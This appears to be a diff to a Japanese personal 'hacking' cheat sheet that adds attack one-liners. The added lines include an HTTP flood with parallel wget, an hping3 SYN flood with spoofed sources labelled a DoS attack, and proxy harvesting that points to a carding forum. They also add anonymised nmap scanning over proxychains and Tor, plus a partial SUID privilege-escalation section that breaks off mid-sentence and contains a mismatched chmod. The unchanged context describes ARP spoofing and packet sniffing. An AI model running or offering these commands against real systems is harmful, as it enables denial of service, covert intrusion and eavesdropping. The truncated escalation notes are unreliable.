@@ -1,6 +1,65 @@
 ハッキングについて
 ============================
 
+小ネタ
+------------------------
+
+* 攻撃: `yes $URL_NAME | xargs -P200 -I{} wget -q -O - {}`
+
+* 日本で利用出来る proxy : `curl http://dogdev.net/Proxy/api/text/JP/r  | while read ip; do echo $ip; curl -x $ip -m 2 -L http://ipcheck.com; done`
+  * http://www.altenen.com/ + good socks,  proxyfire.com
+
+* hacking 用の秘密鍵・公開鍵のペアを作成する
+    $ ssh-keygen -t rsa -f hacker
+
+* 秘密鍵から公開鍵を作成
+    $ ssh-keygen -y -f id_rsa
+
+* 秘密鍵にパスフレーズを設定する or 外す
+    $ ssh-keygen -p -f key
+
+* ssh-agent にパスフレーズ付きの秘密鍵を追加
+    $ ssh-add ~/.ssh/id_rsa
+    $ ssh-add -l
+
+* Socks 経由でアクセスする: `ssh -o ProxyCommand='nc -x proxy-host:poxy-port %h %p' user@example.com`
+  nc -x で Socks プロキシを指定する
+
+* DOS Attack は hping3 で出来る: `sudo hping3 --rand-source -i u1 -S -p <port> <ip-addr> `
+   * `-i <micro-second>`: 1 マイクロセカンド秒待ってからパケットを送信
+   * `--rand-source`: IP アドレスをランダムに設定
+   * `-L`: tcp ack flag を設定する
+
+* socat で FTP を tor で経由する: `socat TCP4-LISTEN:2021,fork SOCKS4A:localhost:obfuscated.onion:21,socksport=9050`
+
+* 簡易webサーバー:
+
+    $ while true; do echo -e 'HTTP/1.1 200 OK\r\n' | sudo netcat -v -l -p 80 -q 1; done
+    # 終了: ^Z && exit
+    
+    $ sudo ruby -v -run -e httpd . --port 80 --bind-address 0.0.0.0
+
+    $ { while true; do echo -ne "HTTP/1.0 200 OK\r\n\r\n" | sudo nc -l -p 80 -q 1; done } | tee data.txt
+
+    $ { while true; do echo -ne "HTTP/1.0 200 OK\r\n\r\n" | sudo nc -vvv -l -p 80 -q 1 2>&1; done } | tee data.txt
+    
+    $ { while true; do echo -ne "HTTP/1.0 200 OK\r\n\r\n" | sudo nc -vvv -l -p 80 -w 1 2>&1; done } | tee data.txt
+
+ハッキング
+-----------------
+
+* TOR 越しにホスト名検索: `tor-resolve google.co.jp`
+  逆検索: `tor-resolve -x 192.168.0.1`
+
+* コマンドラインから POST で送る: `curl -d 'name1=value1&name2=value2' url`
+
+* Proxy で nma: p `proxychains nmap -sT -PN -n -sV -p 80,443,21,22 217.xx.xx.xx`
+  * `-sT`: full TCP connection scan
+  * `-PN`: do not perform host discovery
+  * `-n`: never perform DNS resolution (to prevent DNS leaks)
+  * `-sV`: determine service version/info
+  * `-p`: port to scan
+
 arp snooping
 ----------------------------
 
@@ -35,7 +94,7 @@ NIC: eth0
 
 1. NICの設定
 
-eth0を既存用のネットワーク, 盗聴用のネットワーク用に2つ用意する。
+Eth0を既存用のネットワーク, 盗聴用のネットワーク用に2つ用意する。
 全てスタティックIPアドレスで振り分ける。
 
     $ sudo emacs /etc/network/interfaces
@@ -152,3 +211,22 @@ iptablesの設定とipフォワードを設定を行わなければならない�
 もし正しく接続できていれば、urlsnarfを使ってhttpパケットの盗聴が行える。
 
     $ sudo urlsnarf -v -i eth0
+
+一般ユーザーから root への権限上昇
+----------------------------
+
+### sticky bit を利用する ###
+
+SUID: ファイルの所有者の権限で実行される
+SUIG: ファイルの所有グループの権限で実行される
+
+SUID の探し方
+
+    $ find / -type f -perm -04000
+
+sticky bit を設定する
+
+    $ chmod u+x filename
+
+書込権限のある SUID を
+
